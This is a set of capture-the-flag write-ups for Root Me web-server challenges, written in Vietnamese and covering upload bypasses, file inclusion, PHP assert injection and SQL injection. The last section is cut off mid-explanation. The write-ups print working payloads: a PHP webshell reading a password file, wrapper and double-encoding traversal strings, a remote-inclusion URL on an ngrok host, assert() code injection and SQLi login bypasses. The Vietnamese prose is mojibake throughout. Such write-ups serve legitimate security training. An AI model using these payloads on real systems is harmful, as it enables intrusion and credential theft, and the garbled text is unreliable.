<p><img src="PHP/Fileupload-Doubleextensions/./media/image4.png" alt="" /></p>
<p><img src="PHP/Fileupload-Doubleextensions/./media/image5.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload---mime-type"><a class="header" href="#file-upload---mime-type"><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type">File upload - MIME type</a></a></h1>
<p>ƒê·ªÅ y√™u c·∫ßu ta t√¨m .passwd. Th·ª≠ check v·ªõi .passwd t·∫°i <strong>/ch21/.passwd</strong> th√¨ nh·∫≠n ƒë∆∞·ª£c 404 Forbidden:</p>
<p><img src="PHP/Fileupload-MIMEtype/./media/image1.png" alt="" /></p>
<p>Website c√≥ cung c·∫•p m·ªôt c·ªïng upload v√† challenge c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn <strong>MIME type</strong>. ·ªïng n√†y sau khi nh·∫≠n file c·ªßa ta th√¨ l∆∞u tr·ªØ t·∫°i <code>./[name]</code>. B√¢y gi·ªù ta c·∫ßn ch√®n payload v√†o ƒë·ªÉ push l√™n server:</p>
<p><img src="PHP/Fileupload-MIMEtype/./media/image2.png" alt="" /></p>
<p><img src="PHP/Fileupload-MIMEtype/./media/image3.png" alt="" /></p>
<p>URL sau khi upload: <a href="http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/40ce7d3f3fe27d0d9c1970598b6d09a8//nh4ttruong.jpg">http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/40ce7d3f3fe27d0d9c1970598b6d09a8//nh4ttruong.jpg</a></p>
<p>L√∫c ƒë·∫ßu, ta ƒë√£ bi·∫øt .passwd n·∫±m t·∫°i ‚Ä¶/ch21/.passwd. Do ƒë√≥, ta c·∫ßn ƒëi ng∆∞·ª£c folder 3 l·∫ßn ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c.</p>
<p>G·∫Øn <a href="https://www.php.net/manual/en/function.mime-content-type.php">shell_exec()</a> v√†o file <code>nh4ttruong123.php.jpg</code>:</p>
<pre><code class="language-php">&lt;?php  
$output¬†=¬†shell_exec('cat ../../../.passwd');  
echo¬†"&lt;pre&gt;&lt;/pre&gt;$output&lt;/pre&gt;";  
?&gt;
``

B·ªüi v√¨ server ch·ªâ cho ta upload c√°c file image (jpeg/png/gif), do ƒë√≥, ta c·∫ßn s·ª≠ d·ª•ng BurpSuite ƒë·ªÉ modify request convert `.jpg` sang `.php`:

![](./media/image4.png)

Mod th√†nh c√¥ng:

![](./media/image5.png)

Code ƒë√£ ch·∫°y, ta get ƒë∆∞·ª£c password:

![](./media/image6.png)

![](./media/image7.png)

- Flag: "****************************"
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="http---directory-indexing"><a class="header" href="#http---directory-indexing"><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing">HTTP - Directory indexing</a></a></h1>
<p>Theo g·ª£i √Ω t·ª´ ƒë·ªÅ b√†i <strong>CTRL+U</strong>, ta view-source th√¨ nh·∫≠n ƒë∆∞·ª£c d√≤ng comment:</p>
<p><img src="PHP/HTTP-Directoryindexing/./media/image1.png" alt="" /></p>
<p>Truy c·∫≠p ƒë·∫øn <code>admin.pass.html</code> th·∫•y ƒë∆∞·ª£c message rick roll:</p>
<p><img src="PHP/HTTP-Directoryindexing/./media/image2.png" alt="" /></p>
<p>Back l·∫°i, ta t√¨m trong folder admin xem c√≥ g√¨:</p>
<p><img src="PHP/HTTP-Directoryindexing/./media/image3.png" alt="" /></p>
<p>M√≤ m·ªôt l√∫c th√¨ ta th·∫•y ƒë∆∞·ª£c password n·∫±m t·∫°i <code>admin/backup/admin.txt</code> (<a href="http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt">http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt</a>)</p>
<p><img src="PHP/HTTP-Directoryindexing/./media/image4.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion"><a class="header" href="#local-file-inclusion"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion">Local File Inclusion</a></a></h1>
<p>Website c√≥ r·∫•t nhi·ªÅu tab v√† g√¢y confuse khi l√†m:</p>
<p><img src="PHP/LocalFileInclusion/./media/image1.png" alt="" /></p>
<p>C√¢u query URL c√≥ d·∫°ng <a href="http://challenge01.root-me.org/web-serveur/ch16/?files=crypto&amp;f=index.html">challenge01.root-me.org/web-serveur/ch16/?files=sysadm&amp;f=index.html</a> v·ªõi files s·∫Ω ch·ªâ ƒë·ªãnh folder v√† f s·∫Ω ch·ªâ ƒë·ªãnh t·ªáp ho·∫∑c folder con m√† ta ch·ªçn:</p>
<p><img src="PHP/LocalFileInclusion/./media/image2.png" alt="" /></p>
<p><img src="PHP/LocalFileInclusion/./media/image3.png" alt="" /></p>
<p>Chuy·ªÉn qua m√≤ tab Admin th√¨ website b·∫Øt login. Bi·∫øt g√¨ ƒë√¢u m√† login :v. T·∫Øt promt login th√¨ ta nh·∫≠n ƒë∆∞·ª£c d√≤ng text:</p>
<p><img src="PHP/LocalFileInclusion/./media/image4.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, website s·ª≠ d·ª•ng backend l√† PHP. Th·ª≠ m√≤ file source code c·ªßa n√≥ d·ª±a theo query ·ªü tr√™n:</p>
<p><img src="PHP/LocalFileInclusion/./media/image5.png" alt="" /></p>
<p>L·ªói tr·∫£ v·ªÅ l√† <code>file_get_contents()</code> kh√¥ng t√¨m ƒë∆∞·ª£c filename. Sau khi th·ª≠ fuzz m·ªôt l√∫c th√¨ ph√°t hi·ªán ra website kh√¥ng block <code>‚Äò../‚Äô.</code> ƒê√£ ƒë·∫øn l√∫c ta d√πng <strong>Path Traversal</strong>.</p>
<p>Th·ª≠ v·ªõi <code>files=../</code>:</p>
<p><img src="PHP/LocalFileInclusion/./media/image6.png" alt="" /></p>
<p>L√∫c n√†y, ta th·∫•y ƒë∆∞·ª£c c√°c th∆∞ m·ª•c cha ch·ª©a th∆∞ m·ª•c files, trong ƒë√≥, c√≥ folder admin. ƒê·∫∑c bi·ªát, website c√≥ m·ªôt file l√† index.php gi·ªëng nh∆∞ ·ªü homepage c·ªßa website. V·∫≠y h∆∞·ªõng c·ªßa ta l√† xem ƒë∆∞·ª£c c√°c file c√≥ trong folder admin (nh∆∞ index.php). Th·ª≠ tr·ªè <code>files=../admin</code> v√† <code>&amp;f=index.php</code> th√¨ ta ƒë√£ truy c·∫≠p th√†nh c√¥ng index.php:</p>
<p><img src="PHP/LocalFileInclusion/./media/image7.png" alt="" /></p>
<p>D√≤ source code ta th·∫•y ƒë∆∞·ª£c 2 d√≤ng code r·∫•t gi√° tr·ªã:</p>
<p><img src="PHP/LocalFileInclusion/./media/image8.png" alt="" /></p>
<p>V·∫≠y l√† ƒë√£ t√¨m ƒë∆∞·ª£c account c·ªßa admin:</p>
<pre><code class="language-yaml">- Username: admin
- Password: OpbNJ60xYpvAQU8
</code></pre>
<p><img src="PHP/LocalFileInclusion/./media/image9.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion--double-encoding"><a class="header" href="#local-file-inclusion--double-encoding"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding">Local File Inclusion ‚Äì Double Encoding</a></a></h1>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image1.png" alt="" /></p>
<p>Fuzz v·ªõi <strong>Path Traversal</strong>, ta th·∫•y web server block ho·∫∑c filter <code>‚Äò../‚Äô</code>:</p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image2.png" alt="" /></p>
<p>T√™n challenge l√† <strong>LFI ‚Äì Double Encoding URL Double Encoding</strong>. Ta convert <code>../</code> --&gt; <code>%252E%252E%252F</code> () <code>%252E = .</code> ; <code>%252F = /</code>)</p>
<p>ƒê∆∞a v√†o <code>?page=[value]</code> ta ƒë∆∞·ª£c:</p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image3.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, sau khi append b·∫•t k·ª≥ text n√†o th√¨ server s·∫Ω concat <strong>text.inc.php</strong>:</p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image4.png" alt="" /></p>
<p>D·∫°o quanh <strong>index.html</strong> v√† homepage th√¨ kh√¥ng ph√°t hi·ªán b·∫•t k·ª≥ ƒëi·ªÅu g√¨ ƒë·∫∑c bi·ªát. T∆∞∆°ng t·ª± c√°c b√†i LFI kh√°c, ta c·∫ßn get source ƒë·ªÉ xem t√°c gi·∫£ ƒë·∫∑t g√¨ trong web. Khi xem v·ªÅ c√°ch get source php, ta c√≥ payload get nh∆∞ sau:</p>
<p><code>?page=php://filter/convert.base64-encode/resource=[source_file]</code></p>
<p>Gi·ªù th√¨ ƒë∆∞a v√†o payload ta ƒë·ªÉ get source ·ªü <strong>home.inc.php</strong>:</p>
<p><code>?page=php://filter/convert.base64-encode/resource=home</code></p>
<p>Double encoding: <code>?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome</code></p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image5.png" alt="" /></p>
<p>B·ªè v√†o base64 decode:</p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image6.png" alt="" /></p>
<p>View source kh√¥ng t√¨m ƒë∆∞·ª£c g√¨ ƒë·∫∑c bi·ªát. Tuy v·∫≠y, website ƒë√£ s·ª≠ d·ª•ng th∆∞ vi·ªán t·ª´ <strong>conf.inc.php</strong>. T·ª´ ƒë√≥, ti·∫øn h√†nh xem th·ª≠ <strong>conf.inc.php</strong>:</p>
<p><code>?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf</code></p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image7.png" alt="" /></p>
<p>Flag xu·∫•t hi·ªán trong <strong>conf.inc.php</strong>:</p>
<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image8.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion---wrappers"><a class="header" href="#local-file-inclusion---wrappers"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers">Local File Inclusion - Wrappers</a></a></h1>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image1.png" alt="" /></p>
<p>Khi th·ª≠ upload without source, ta nh·∫≠n ƒë∆∞·ª£c message:</p>
<blockquote>
<p>"Sorry, only JPG images will be accepted. Please use a different service if you do not intend to upload pictures‚Äù</p>
</blockquote>
<p>ƒê·ªÅ b√†i g·ª£i √Ω l√† Wrapper, ta ch√∫ √Ω ƒë·∫øn PHP Wrapper. D√≥ ƒë√≥ th·ª≠ d·ª•ng <code>php://filter</code> ƒë·ªÉ get source <strong>index.php</strong> nh∆∞ng kh√¥ng kh·∫£ thi:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image2.png" alt="" /></p>
<p>S·ª≠ d·ª•ng data wrapper th√¨ b·ªã nh·∫≠n di·ªán attack c√≤n s·ª≠ d·ª•ng encode base64 th√¨ nh·∫≠n ƒë∆∞·ª£c l·ªói <strong>‚Äúpage name too long‚Äù</strong>:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image3.png" alt="" /></p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image4.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, ch·∫Øc c√≥ l·∫Ω ta c·∫ßn s·ª≠ d·ª•ng c·ªïng upload n√†y ƒë·ªÉ upload command l√™n server, sau ƒë√≥, d√πng wrapper ƒë·ªÉ ch·∫°y file. Ta s·ª≠ d·ª•ng ƒë·∫øn wrapper <strong>zip://</strong> ƒë·ªÉ ƒë·ªçc file t·ª´ zip v√¨ c√≥ l·∫Ω server ch·∫∑n c√°c c·ªïng data m·∫•t r·ªìi:</p>
<p>Code <code>getsource.php</code>:</p>
<pre><code class="language-html">&lt;pre&gt;&lt;?php show_source('index.php'); ?&gt;&lt;/pre&gt;;
</code></pre>
<p>Ta ƒë·∫∑t t√™n l√† <strong>getsource.php</strong>, sau ƒë√≥ zip file l·∫°i <strong>getsource.zip</strong>, rename <strong>getsource.jpg</strong> , sau ƒë√≥ upload l√™n server:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image5.png" alt="" /></p>
<p>Ch√∫ √Ω ƒë·∫øn c·∫•u tr√∫c URL: <a href="http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un</a></p>
<p>L√∫c n√†y, page ƒëang load m·ªôt filename c√≥ id l√† <strong>8Gjbt40un</strong> kh√°c v·ªõi image name c·ªßa ta Server ƒë√£ upload l√™n <code>/tmp/upload/image_id.jpg</code>. S·ª≠ d·ª•ng zip wrapper tuy c·∫≠p ƒë·∫øn <strong>/tmp/upload/8Gjbt40un.jpg%23getsource</strong>, server s·∫Ω t·ª± concat th√™m ‚Äò.php‚Äô cho ta ƒë·ªÉ c√≥ c√¢u request ho√†n ch·ªânh:</p>
<p><em>?page=zip://tmp/upload/8Gjbt40un.jpg%23getsource</em>*.php***</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image6.png" alt="" /></p>
<p>Tuy nhi√™n, ta l·∫°i nh·∫≠n ƒë∆∞·ª£c l·ªói t√™n qu√° d√†i. Ta c·∫ßn rename l·∫°i th√†nh t.php t.zip t.jpg, sau ƒë√≥ upload l·∫°i:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image7.png" alt="" /></p>
<p><em><strong>Payload:</strong> ?page=zip://tmp/upload/XoMA4xJDj.jpg%23</em><em>t.php</em>**</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image8.png" alt="" /></p>
<p>Source kh√¥ng c√≥ th√¥ng tin g√¨ li√™n quan ƒë·∫øn password c·∫£, gi·ªù th√¨ ta ph·∫£i th·ª≠ t√¨m trong folder ch·ª© index.php v√¨ c√≥ th·ªÉ s·∫Ω c√≥ file kh√°c nh∆∞ng ta kh√¥ng Path Traversal ƒëc:</p>
<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php shell_exec('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image9.png" alt="" /></p>
<p><code>shell_exec()</code> b·ªã block. Ta th·ª≠ v·ªõi:</p>
<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php system('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image10.png" alt="" /></p>
<p><code>system()</code> c≈©ng b·ªã block. Ta th·ª≠ v·ªõi <code>exec()</code> nh∆∞ng c≈©ng b·ªã block:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image11.png" alt="" /></p>
<p>Kh√¥ng c√≤n c√°ch n√†o kh√°c, ta s·ª≠ d·ª•ng <code>scandir()</code> ƒë·ªÉ list all file trong director:</p>
<pre><code class="language-php">&lt;pre&gt;
&lt;?php
$path = './';
$files = scandir($path);

foreach($files as $file) {
    echo "&lt;a href='$file'&gt;$file&lt;/a&gt;";
}
?&gt;
&lt;/pre&gt;;
</code></pre>
<p>Xong, n√≥ list all ra ƒë∆∞·ª£c v√† ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c flag:</p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image12.png" alt="" /></p>
<p>ƒê·ªçc file flag v·ªõi:</p>
<p><code>&lt;pre&gt;&lt;?php show\_source('flag-mipkBswUppqwXlq9ZydO.php'); ?&gt;&lt;/pre&gt;;</code></p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image13.png" alt="" /></p>
<p><img src="PHP/LocalFileInclusion-Wrappers/./media/image14.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php---assert"><a class="header" href="#php---assert"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-assert">PHP - assert()</a></a></h1>
<p>Th·ª≠ fuzz v·ªõi payload: <code>http://challenge01.root-me.org/web-serveur/ch47/?page=../</code></p>
<p><img src="PHP/PHP-assert()/./media/image1.png" alt="" /></p>
<p>Website s·ª≠ d·ª•ng <code>assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</code> ƒë·ªÉ check xem y√™u c·∫ßu t√¨m xem c√≥ file hay kh√¥ng, n·∫øu l·ªói th√¨ hi·ªán message. Nh∆∞ v·∫≠y, ta c·∫ßn injecton h√†m assert n√†y. Tra cheat sheet ta c√≥ th·ªÉ nh√©t BOOLEAN k√®m theo ƒë·ªÉ bu·ªôc th·ª±c thi v·ªõi <strong>die()</strong> v√† ƒë·ªÉ hi·ªÉn th·ªã source b·∫±ng h√†m <code>show_source()</code>: <code>and die(show_source('.passwd')) or '</code></p>
<p>L√∫c n√†y payload c√≥ d·∫°ng:</p>
<p><code>assert("strpos(' ' and die(show\_source('.passwd')) or ' ', '..') === false") or die("Detected hacking attempt!");</code></p>
<p><strong>Payload:</strong> <code>http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show_source(%27.passwd%27))%20or%20%27</code></p>
<p><img src="PHP/PHP-assert()/./media/image2.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php---filters"><a class="header" href="#php---filters"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters">PHP - Filters</a></a></h1>
<p>Test payload tr·ª±c ti·∫øp ƒë·∫øn <code>/etc/passwd</code> th√¨ nh·∫≠n ƒë∆∞·ª£c l·ªói r√†ng bu·ªôc v·ªõi <code>/etc/passwd</code>.</p>
<p><img src="PHP/PHP-Filters/./media/image1.png" alt="" /></p>
<p>Th·∫≠t ra URL kh√¥ng filter keyword c·ªßa m√¨nh nh∆∞ng m√† kh√¥ng th·ªÉ n√†o get n√≥ theo c√°ch n√†y ƒë∆∞·ª£c. Chuy·ªÉn qua d√πng wrapper php v·ªõi base64 ƒë·ªÉ get source index.php:</p>
<p><img src="PHP/PHP-Filters/./media/image2.png" alt="" /></p>
<p><img src="PHP/PHP-Filters/./media/image3.png" alt="" /></p>
<p>Get source <strong>ch12.php</strong>:</p>
<p><img src="PHP/PHP-Filters/./media/image4.png" alt="" /></p>
<p><img src="PHP/PHP-Filters/./media/image5.png" alt="" /></p>
<p>V·∫≠y l√† website c√≥ <code>config.php</code>, get source <code>config.php</code>:</p>
<p><img src="PHP/PHP-Filters/./media/image6.png" alt="" /></p>
<p><img src="PHP/PHP-Filters/./media/image7.png" alt="" /></p>
<pre><code class="language-yaml">Username: admin
Password: DAPt9D2mky0APAF
</code></pre>
<p><img src="PHP/PHP-Filters/./media/image8.png" alt="" /></p>
<p><img src="PHP/PHP-Filters/./media/image9.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php--register-globals"><a class="header" href="#php--register-globals"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals">PHP ‚Äì register globals</a></a></h1>
<p>Theo document, ta c√≥ c√°c global variable th∆∞·ªùng g·∫∑p l√†: <code>_REQUEST</code>, <code>_SESSION</code>, <code>_SERVER</code>, <code>_ENV</code>, <code>_FILES</code>. Ki·ªÉm tra cookie c·ªßa website, ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c PHP Session ID. T·ª´ ƒë√≥, ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c website c√≥ th·ªÉ s·ª≠ d·ª•ng <code>_SESSION</code> ƒë·ªÉ l∆∞u tr·ªØ m·∫£ng c√°c session (<a href="https://www.php.net/manual/en/reserved.variables.session.php">PHP: $_SESSION - Manual</a>).</p>
<p><img src="PHP/PHP-registerglobal/./media/image1.png" alt="" /></p>
<p>Th·ª≠ b·∫±ng payload v·ªõi <code>/index.php?_SESSION[logged]=1</code>, ta t√¨m ƒë∆∞·ª£c password:</p>
<p><img src="PHP/PHP-registerglobal/./media/image2.png" alt="" /></p>
<pre><code class="language-yaml">Password: **NoTQYipcRKkgrqG**
</code></pre>
<p><img src="PHP/PHP-registerglobal/./media/image3.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion"><a href="https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion">Remote File Inclusion</a></a></h1>
<p>Website c√≥ thi·∫øt l·∫≠p parameter <code>?lang</code> ƒë·ªÉ ƒë·ªçc source t·ª´ lang.php:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image1.png" alt="" /></p>
<p>Fuzz v√†o URL th√¨ ta bi·∫øt ƒë∆∞·ª£c, server s·∫Ω t·ª± ƒë·ªông concat th√™m <code>_lang.php</code> v√†o cu·ªëi keyword ta g√°n v√†o <code>?lang</code>:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image2.png" alt="" /></p>
<p>Challenge n√†y th·ª≠ th√°ch v·ªÅ RFI, ta th·ª≠ ch√®n m·ªôt website b·∫•t k·ª≥ v√†o <code>?lang</code>:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image3.png" alt="" /></p>
<p>Nh∆∞ ban n√£y, server t·ª± concat th√™m <code>_lang.php</code>, ta s·ª≠ d·ª•ng <code>?</code> ƒë·ªÉ bypass ph·∫ßn concat v·ªõi payload: <code>http://challenge01.root-me.org/web-serveur/ch13/?lang=https://github.com/nh4ttruong?</code></p>
<p><img src="PHP/RemoteFileInclusion/./media/image4.png" alt="" /></p>
<p>Bypass th√†nh c√¥ng, gi·ªù th√¨ ta s·ª≠ d·ª•ng server ƒë·ªÉ RFI qua challenge n√†y. Set-up m·ªôt file t√™n l√† <strong>ntruong.txt</strong> v·ªõi content l√† payload PHP:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image5.png" alt="" /></p>
<p>S·ª≠ d·ª•ng ngrok server ƒë·ªÉ public IP Address:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image6.png" alt="" /></p>
<p>URL ƒë·ªÉ RFI: <code>https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt</code></p>
<p><img src="PHP/RemoteFileInclusion/./media/image7.png" alt="" /></p>
<p>Gi·ªù th√¨ g·∫Øn v√†o <code>?lang</code> ta ƒë∆∞·ª£c:</p>
<p><img src="PHP/RemoteFileInclusion/./media/image8.png" alt="" /></p>
<pre><code class="language-yaml">Password: R3m0t3_iS_r3aL1y_********************
</code></pre>
<p><img src="PHP/RemoteFileInclusion/./media/image9.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection-challenges"><a class="header" href="#sql-injection-challenges">SQL Injection Challenges</a></h1>
<p>Welcome to the <strong>SQL Injection</strong> category of Root Me write-ups! This section provides detailed, educational solutions to a variety of SQL Injection (SQLi) challenges from the Root Me platform. Each write-up is designed to help you understand different SQLi techniques, bypasses, and real-world exploitation scenarios.</p>
<hr />
<h2 id="-list-of-challenges"><a class="header" href="#-list-of-challenges">üìù List of Challenges</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>SQL injection - Authentication GBK</td><td><a href="SQL-Injection/./SQLinjection-AuthenticationGBK/SQLinjection-AuthenticationGBK.html">Read more</a></td></tr>
<tr><td>SQL injection - Authentication</td><td><a href="SQL-Injection/./SQLinjection-Authentication/SQLinjection-Authentication.html">Read more</a></td></tr>
<tr><td>SQL injection - error based</td><td><a href="SQL-Injection/./SQLinjection-errorbased/SQLinjection-errorbased.html">Read more</a></td></tr>
<tr><td>SQL injection - File reading</td><td><a href="SQL-Injection/./SQLinjection-Filereading/SQLinjection-Filereading.html">Read more</a></td></tr>
<tr><td>SQL injection - Insert</td><td><a href="SQL-Injection/./SQLinjection-Insert/SQLinjection-Insert.html">Read more</a></td></tr>
<tr><td>SQL injection - Routed</td><td><a href="SQL-Injection/./SQLinjection-Routed/SQLinjection-Routed.html">Read more</a></td></tr>
<tr><td>SQL injection - Time-based</td><td><a href="SQL-Injection/./SQLinjection-Time-based/SQLinjection-Time-based.html">Read more</a></td></tr>
<tr><td>SQL injection numeric</td><td><a href="SQL-Injection/./SQLinjectionnumeric/SQLinjectionnumeric.html">Read more</a></td></tr>
<tr><td>SQL injection string</td><td><a href="SQL-Injection/./SQLinjectionstring/SQLinjectionstring.html">Read more</a></td></tr>
<tr><td>SQL Truncation</td><td><a href="SQL-Injection/./SQLTruncation/SQLTruncation.html">Read more</a></td></tr>
<tr><td>SQL injection - Filter bypass</td><td><a href="SQL-Injection/./SQLinjection-Filterbypass/SQLinjection-Filterbypass.html">Read more</a></td></tr>
</tbody></table>
</div>
<hr />
<h2 id="-feedback"><a class="header" href="#-feedback">üì¢ Feedback</a></h2>
<p>Feel free to open an issue or submit a pull request for suggestions or improvements!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---authentication"><a class="header" href="#sql-injection---authentication"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication">SQL injection - Authentication</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image1.png" alt="" /></p>
<p>Th·ª≠ v·ªõi payload:</p>
<pre><code class="language-yaml">Username: `1‚Äô--`
Password: `1`
</code></pre>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image2.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, ta kh√¥ng th·ªÉ inject ƒë∆∞·ª£c v√†o input. Th·ª≠ inject v√†o password:</p>
<pre><code class="language-yaml">Username: `1`
Password: `1‚Äô or 1=1--`
</code></pre>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image3.png" alt="" /></p>
<p>Ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c, c√≥ v·∫ª nh∆∞ c·∫ßn ph·∫£i c√≥ username ch√≠nh x√°c m·ªõi c√≥ th·ªÉ inject ƒë∆∞·ª£c ·ªü username, th·ª≠ ki·ªÉm ch·ª©ng b·∫±ng c√°ch inject ·ªü username v·ªõi payload <code>user1‚Äî</code>.</p>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image3.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, ƒë·ªÉ tr·ªôm ƒë∆∞·ª£c password c·ªßa admin, ta c·∫ßn ph·∫£i bi·∫øt username c·ªßa admin ƒë·ªÉ th·ª±c hi·ªán inject. V√† nh·ªù informations hi·ªÉn th·ªã c·ªßa user1, ta c√≥ th·ªÉ ƒëo√°n username c·ªßa admin c√≥ th·ªÉ l√† <strong>admin</strong> ho·∫∑c <strong>administrator.</strong></p>
<p><strong>Th·ª≠ v·ªõi payload:</strong></p>
<pre><code class="language-yaml">-   Username: `admin‚Äô--`
-   Password: `1`
</code></pre>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image4.png" alt="" /></p>
<p>Inspect v√† t√¨m ƒë∆∞·ª£c password c·ªßa admin:</p>
<p><img src="SQL-Injection/SQLinjection-Authentication/./media/image5.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---authentication---gbk"><a class="header" href="#sql-injection---authentication---gbk"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK">SQL injection - Authentication - GBK</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image1.png" alt="" /></p>
<p>Th·ª≠ v·ªõi c√°c payload nh∆∞ b√†i <strong>SQLi Authenticaiton</strong> th√¨ m·ªçi th·ª© ƒë√£ kh√¥ng qua ƒë∆∞·ª£c:</p>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image2.png" alt="" /></p>
<p>Th·ª≠ ƒë·ªïi payload sang l<code>ogin[]=admin&amp;password[]=1</code>, ta nh·∫≠n ƒë∆∞·ª£c th√¥ng b√°o l·ªói sau:</p>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image3.png" alt="" /></p>
<p>T·ª´ ƒë√≥, ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c password s·∫Ω d√πng md5 ƒë√£ hash v√† username s·ª≠ d·ª•ng addslashes() ƒë·ªÉ encoding input. H√†m <a href="https://www.php.net/manual/en/function.addslashes.php">PHP: addslashes - Manual</a> s·∫Ω ch√®n th√™m <code>\</code> tr∆∞·ªõc c√°c k√Ω t·ª± ƒë√≥ng ngo·∫∑c ƒë∆°n ƒë·ªÉ tr√°nh SQL. T·ª´ ƒë√≥, ta ch·ªâ c·∫ßn bypass username qua addslashes l√† c√≥ th·ªÉ SQLi th√†nh c√¥ng.</p>
<p>Theo GBK, n√≥ s·∫Ω th·ª±c hi·ªán m√£ encoding c√°c k√Ω t·ª± hex v·ªÅ ti·∫øng Trung. B√™n c·∫°nh ƒë√≥, n√≥ s·∫Ω encode 2 bytes hex v·ªÅ 1 k√Ω t·ª± ti·∫øng Trung v√† tu√¢n theo quy lu·∫≠t (<a href="https://en.wikipedia.org/wiki/GBK_(character_encoding)">GBK (character encoding) - Wikipedia</a>):</p>
